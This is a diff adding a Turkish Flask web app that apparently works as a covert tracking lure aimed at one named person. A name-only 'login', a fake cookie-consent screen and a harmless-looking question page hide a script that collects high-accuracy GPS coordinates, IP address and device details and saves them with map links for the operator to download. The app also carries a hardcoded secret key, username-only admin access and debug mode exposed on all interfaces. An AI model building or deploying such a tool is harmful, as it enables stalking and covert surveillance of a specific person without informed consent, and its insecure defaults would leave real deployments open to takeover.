@@ -1,0 +1,643 @@
+from flask import Flask, request, render_template_string, send_file, session, redirect, url_for
+import sqlite3
+import json
+import os
+from datetime import datetime
+
+app = Flask(__name__)
+app.secret_key = os.getenv('SECRET_KEY', 'k9m2p5q8r3v6t9w1z4j7x0y3')  # Ortam değişkeninden al, yoksa varsayılan anahtar
+
+# Veritabanı başlatma
+def init_db():
+    try:
+        conn = sqlite3.connect('visitors.db')
+        c = conn.cursor()
+        # Ziyaretçi tablosu
+        c.execute('''CREATE TABLE IF NOT EXISTS visitors
+                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                      ip TEXT, user_agent TEXT, latitude REAL, longitude REAL, accuracy REAL, timestamp TEXT, method TEXT, question TEXT)''')
+        # Admin mesajları tablosu
+        c.execute('''CREATE TABLE IF NOT EXISTS admin_messages
+                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                      message TEXT, timestamp TEXT)''')
+        conn.commit()
+        print("Veritabanı başarıyla başlatıldı")
+    except Exception as e:
+        print(f"Veritabanı başlatma hatası: {e}")
+    finally:
+        conn.close()
+
+# konum.json dosyasına yazma
+def save_to_json(data):
+    try:
+        if os.path.exists('konum.json'):
+            with open('konum.json', 'r') as f:
+                existing_data = json.load(f)
+        else:
+            existing_data = []
+
+        existing_data.append(data)
+        with open('konum.json', 'w') as f:
+            json.dump(existing_data, f, indent=4)
+    except Exception as e:
+        print(f"JSON Kaydetme Hatası: {e}")
+
+# Giriş ekranı şablonu
+LOGIN_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Yap</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
+            background-size: 400%;
+            animation: gradient 15s ease infinite;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 250px;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-size: 1em;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #ff6b6b;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #e55a5a;
+        }
+        .error {
+            color: #ff4d4d;
+            margin-top: 10px;
+            font-size: 1em;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Giriş Yap</h1>
+        <form method="POST" action="{{ url_for('login') }}">
+            <input type="text" name="username" placeholder="İsminizi girin" required>
+            <br>
+            <button type="submit">Giriş Yap</button>
+        </form>
+        {% if error %}
+            <div class="error">{{ error }}</div>
+        {% endif %}
+    </div>
+</body>
+</html>
+"""
+
+# Kurabiye ekranı şablonu
+COOKIE_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kurabiyeleri Kabul Et</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
+            background-size: 400%;
+            animation: gradient 15s ease infinite;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4ecdc4;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #3dbab3;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bu siteyi kullanabilmek için lütfen kurabiyeleri kabul edin.<br>Kurabiyeleri kabul ediyor musunuz?</h1>
+        <form method="POST" action="{{ url_for('accept_cookies') }}">
+            <button type="submit">Kurabiyeleri Kabul Et</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+# Ana sayfa şablonu (normal kullanıcılar için)
+MAIN_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Soru Sor</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
+            background-size: 400%;
+            animation: gradient 15s ease infinite;
+            color: white;
+        }
+        .main-container {
+            display: flex;
+            width: 80%;
+            max-width: 1200px;
+            gap: 20px;
+        }
+        .question-container {
+            flex: 2;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
+        .admin-message-container {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        textarea {
+            width: 300px;
+            height: 100px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-size: 1em;
+            resize: none;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #96c93d;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #85b32f;
+        }
+        .admin-message {
+            font-size: 1em;
+            margin-bottom: 10px;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="question-container">
+            <h1>Yalan Söylemiyecek Olsam Bana Hangi Soruyu Sorardın?</h1>
+            <form method="POST" action="{{ url_for('submit_question') }}">
+                <textarea name="question" placeholder="Sorunuzu buraya yazın" required></textarea>
+                <br>
+                <button type="submit">Gönder</button>
+            </form>
+        </div>
+        <div class="admin-message-container">
+            <h1>Admin Mesajları</h1>
+            {% if admin_messages %}
+                {% for message in admin_messages %}
+                    <div class="admin-message">{{ message.message }}<br><small>{{ message.timestamp }}</small></div>
+                {% endfor %}
+            {% else %}
+                <div class="admin-message">Henüz admin mesajı yok.</div>
+            {% endif %}
+        </div>
+    </div>
+
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    fetch('/save_location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
+                    });
+                },
+                error => {
+                    fetch('/save_location_error', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ error: error.message })
+                    });
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            fetch('/save_location_error', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ error: "Tarayıcı konum servislerini desteklemiyor." })
+            });
+        }
+    </script>
+</body>
+</html>
+"""
+
+# Admin paneli şablonu
+ADMIN_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Paneli</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
+            background-size: 400%;
+            animation: gradient 15s ease infinite;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-size: 1em;
+            resize: none;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #ff6b6b;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #e55a5a;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Admin Paneli</h1>
+        <form method="POST" action="{{ url_for('admin_submit') }}">
+            <textarea name="message" placeholder="Mesajınızı buraya yazın" required></textarea>
+            <br>
+            <button type="submit">Mesaj Gönder</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+# Giriş ekranı
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    print("Giriş ekranı yüklendi")  # Hata ayıklama için log
+    if request.method == 'POST':
+        username = request.form['username']
+        print(f"Kullanıcı giriş denemesi: {username}")  # Hata ayıklama için log
+        if username.lower() == "melike eslem güler" or username.lower() == "admin":
+            session['logged_in'] = True
+            session['username'] = username
+            print("Giriş başarılı, /cookies rotasına yönlendiriliyor")  # Hata ayıklama için log
+            return redirect(url_for('cookies'))
+        else:
+            print("Giriş başarısız: Yanlış kullanıcı adı")  # Hata ayıklama için log
+            return render_template_string(LOGIN_TEMPLATE, error="Lütfen Mes’den şifre isteyin")
+    return render_template_string(LOGIN_TEMPLATE)
+
+# Kurabiye ekranı
+@app.route('/cookies', methods=['GET', 'POST'])
+def cookies():
+    print("Kurabiye ekranı yüklendi")  # Hata ayıklama için log
+    if not session.get('logged_in'):
+        print("Oturum bulunamadı, /login rotasına yönlendiriliyor")  # Hata ayıklama için log
+        return redirect(url_for('login'))
+    return render_template_string(COOKIE_TEMPLATE)
+
+# Kurabiyeleri kabul etme
+@app.route('/accept_cookies', methods=['POST'])
+def accept_cookies():
+    print("Kurabiyeler kabul edildi")  # Hata ayıklama için log
+    if not session.get('logged_in'):
+        print("Oturum bulunamadı, /login rotasına yönlendiriliyor")  # Hata ayıklama için log
+        return redirect(url_for('login'))
+    session['cookies_accepted'] = True
+
+    client_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    print(f"\n=== Yeni Ziyaretçi ===")
+    print(f"Ziyaretçi IP: {client_ip}")
+    print(f"Tarayıcı/Cihaz: {user_agent}")
+    print(f"Zaman: {timestamp}")
+    print(f"Kullanıcı: {session.get('username')}")
+    print("Ana sayfaya yönlendiriliyor (/main)")  # Hata ayıklama için log
+
+    # Kullanıcı admin mi kontrol et
+    if session.get('username').lower() == "admin":
+        return redirect(url_for('admin_panel'))
+    else:
+        return redirect(url_for('main'))
+
+# Ana sayfa (normal kullanıcılar için)
+@app.route('/main')
+def main():
+    print("Ana sayfa yüklendi")  # Hata ayıklama için log
+    if not session.get('logged_in') or not session.get('cookies_accepted'):
+        print("Oturum veya kurabiye kabulü eksik, /login rotasına yönlendiriliyor")  # Hata ayıklama için log
+        return redirect(url_for('login'))
+
+    # Admin mesajlarını al
+    admin_messages = []
+    try:
+        conn = sqlite3.connect('visitors.db')
+        c = conn.cursor()
+        c.execute("SELECT message, timestamp FROM admin_messages ORDER BY timestamp DESC")
+        admin_messages = c.fetchall()
+        admin_messages = [{'message': row[0], 'timestamp': row[1]} for row in admin_messages]
+        print(f"Admin mesajları alındı: {len(admin_messages)} mesaj bulundu")
+    except Exception as e:
+        print(f"Admin mesajlarını alma hatası: {e}")
+        admin_messages = []  # Hata durumunda boş liste döndür
+    finally:
+        conn.close()
+
+    return render_template_string(MAIN_TEMPLATE, admin_messages=admin_messages)
+
+# Admin paneli
+@app.route('/admin', methods=['GET'])
+def admin_panel():
+    print("Admin paneli yüklendi")  # Hata ayıklama için log
+    if not session.get('logged_in') or session.get('username').lower() != "admin":
+        print("Yetkisiz erişim, /login rotasına yönlendiriliyor")  # Hata ayıklama için log
+        return redirect(url_for('login'))
+    return render_template_string(ADMIN_TEMPLATE)
+
+# Admin mesajını kaydet
+@app.route('/admin_submit', methods=['POST'])
+def admin_submit():
+    print("Admin mesajı gönderildi")  # Hata ayıklama için log
+    if not session.get('logged_in') or session.get('username').lower() != "admin":
+        print("Yetkisiz erişim, /login rotasına yönlendiriliyor")  # Hata ayıklama için log
+        return redirect(url_for('login'))
+
+    message = request.form['message']
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    # Veritabanına admin mesajını kaydet
+    try:
+        conn = sqlite3.connect('visitors.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO admin_messages (message, timestamp) VALUES (?, ?)", (message, timestamp))
+        conn.commit()
+        print(f"Admin mesajı kaydedildi: {message}")
+    except Exception as e:
+        print(f"Admin mesajı kaydetme hatası: {e}")
+    finally:
+        conn.close()
+
+    return redirect(url_for('admin_panel'))  # Mesaj gönderildikten sonra admin paneline yönlendir
+
+# Konumu kaydet
+@app.route('/save_location', methods=['POST'])
+def save_location():
+    try:
+        data = request.get_json()
+        latitude = data['latitude']
+        longitude = data['longitude']
+        accuracy = data['accuracy']
+        client_ip = request.remote_addr
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+        # Google Maps linki oluştur
+        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
+
+        # Terminalde göster
+        print(f"Hassas Konum (HTML5): Enlem {latitude}, Boylam {longitude}")
+        print(f"Sapma: {accuracy} metre")
+        print(f"Harita: {maps_url}")
+        if accuracy > 100:
+            print("UYARI: Sapma değeri yüksek! Daha doğru konum için: GPS/Wi-Fi açık olmalı, açık alanda test yapılmalı.")
+
+        # konum.json dosyasına kaydet
+        location_data = {
+            "ip": client_ip,
+            "latitude": latitude,
+            "longitude": longitude,
+            "accuracy_meters": accuracy,
+            "maps_url": maps_url,
+            "timestamp": timestamp,
+            "method": "HTML5 Geolocation",
+            "username": session.get('username')
+        }
+        save_to_json(location_data)
+
+        # Veritabanına kaydet
+        conn = sqlite3.connect('visitors.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO visitors (ip, user_agent, latitude, longitude, accuracy, timestamp, method) VALUES (?, ?, ?, ?, ?, ?, ?)",
+                  (client_ip, request.headers.get('User-Agent'), latitude, longitude, accuracy, timestamp, "HTML5 Geolocation"))
+        conn.commit()
+        conn.close()
+
+        return 'Konum alındı'
+    except Exception as e:
+        print(f"Konum Hata: {e}")
+        return 'Konum alınamadı', 400
+
+# Konum hatasını kaydet
+@app.route('/save_location_error', methods=['POST'])
+def save_location_error():
+    try:
+        data = request.get_json()
+        error_message = data['error']
+        print(f"Konum Alınamadı: {error_message}")
+
+        # Hata mesajını konum.json'a kaydet
+        location_data = {
+            "error": error_message,
+            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            "username": session.get('username')
+        }
+        save_to_json(location_data)
+
+        return 'Hata alındı'
+    except Exception as e:
+        print(f"Hata Kaydetme Hatası: {e}")
+        return 'Hata alınamadı', 400
+
+# Soruyu kaydet
+@app.route('/submit_question', methods=['POST'])
+def submit_question():
+    print("Soru gönderildi")  # Hata ayıklama için log
+    if not session.get('logged_in') or not session.get('cookies_accepted'):
+        print("Oturum veya kurabiye kabulü eksik, /login rotasına yönlendiriliyor")  # Hata ayıklama için log
+        return redirect(url_for('login'))
+    
+    question = request.form['question']
+    client_ip = request.remote_addr
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    # Loglara yaz
+    print(f"Kullanıcı: {session.get('username')}")
+    print(f"Soru: {question}")
+    print(f"Zaman: {timestamp}")
+
+    # konum.json’a soruyu ekle
+    location_data = {
+        "ip": client_ip,
+        "question": question,
+        "timestamp": timestamp,
+        "username": session.get('username')
+    }
+    save_to_json(location_data)
+
+    # Veritabanına soruyu ekle
+    try:
+        conn = sqlite3.connect('visitors.db')
+        c = conn.cursor()
+        c.execute("UPDATE visitors SET question = ? WHERE ip = ? AND timestamp = ?",
+                  (question, client_ip, timestamp))
+        conn.commit()
+    except Exception as e:
+        print(f"Soru kaydetme hatası: {e}")
+    finally:
+        conn.close()
+
+    return redirect(url_for('main'))  # Soru gönderildikten sonra tekrar ana sayfaya yönlendir
+
+# Dosya indirme rotası
+@app.route('/download/<filename>')
+def download_file(filename):
+    print(f"Dosya indirme isteği: {filename}")  # Hata ayıklama için log
+    if not session.get('logged_in'):
+        print("Oturum bulunamadı, /login rotasına yönlendiriliyor")  # Hata ayıklama için log
+        return redirect(url_for('login'))
+    if filename in ['konum.json', 'visitors.db']:
+        return send_file(filename, as_attachment=True)
+    return "Dosya bulunamadı", 404
+
+if __name__ == '__main__':
+    init_db()  # Veritabanını başlat
+    app.run(host='0.0.0.0', port=5000, debug=True)
